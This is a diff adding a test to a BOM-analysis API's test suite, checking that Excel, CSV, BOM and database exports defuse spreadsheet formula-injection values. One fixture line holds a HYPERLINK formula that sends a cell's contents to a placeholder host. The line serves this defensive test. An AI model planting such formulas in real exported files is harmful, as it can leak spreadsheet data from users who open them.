@@ -1489,3 +1489,35 @@ def test_unexpected_server_error_gives_a_clear_answer(monkeypatch):
     assert r.json()["detail"].startswith("Server error")
     # Expected errors keep their own status and message
     assert client.get("/api/components/999999").status_code == 404
+
+
+# ------------------------------------------------------------------ fixes from the end-to-end tests
+
+FORMULA_BOM = (
+    'Designator;Manufacturer;MPN;Description\n'
+    'U1;Texas Instruments;LM358DR;=HYPERLINK("http://example.invalid/?"&A2,"Datasheet")\n'
+    'U2;Acme;=1+1;-12V converter\n'
+    'U3;@SUM(1+1);+XYZ;-5\n'
+)
+
+
+def test_exports_never_contain_formulas():
+    # Excel report: no formula cell, the text is kept as written
+    import openpyxl
+    xlsx = client.post("/api/analyze?format=xlsx", files={"file": ("f.csv", FORMULA_BOM.encode())}).content
+    wb = openpyxl.load_workbook(io.BytesIO(xlsx))
+    assert not [c.coordinate for ws in wb.worksheets for row in ws.iter_rows() for c in row if c.data_type == "f"]
+    values = [c.value for row in wb["Detail"].iter_rows() for c in row]
+    assert "=1+1" in values and '=HYPERLINK("http://example.invalid/?"&A2,"Datasheet")' in values
+    # CSV report and modified BOM: cells that a spreadsheet would evaluate start with an apostrophe
+    report = client.post("/api/analyze?format=csv", files={"file": ("f.csv", FORMULA_BOM.encode())}).content.decode("utf-8-sig")
+    assert "'=1+1" in report and "'+XYZ" in report and "'-12V converter" in report and "'@SUM(1+1)" in report
+    assert ";-5;" in report  # a signed number stays a number
+    lm = comp_id("LM358DR")
+    bom = client.post("/api/analyze?format=bom", files={"file": ("f.csv", FORMULA_BOM.encode())},
+                      data={"substitutions": json.dumps({"3": lm})}).content.decode("utf-8-sig")
+    assert "'=HYPERLINK" in bom and "'@SUM(1+1)" in bom
+    # Database export
+    client.post("/api/components", json={"mpn": "FORMULA-1", "manufacturer": "Acme", "description": "=1+2", "source": "@SUM(1)"})
+    export = client.get("/api/components/export").content.decode("utf-8-sig")
+    assert "'=1+2" in export and "'@SUM(1)" in export
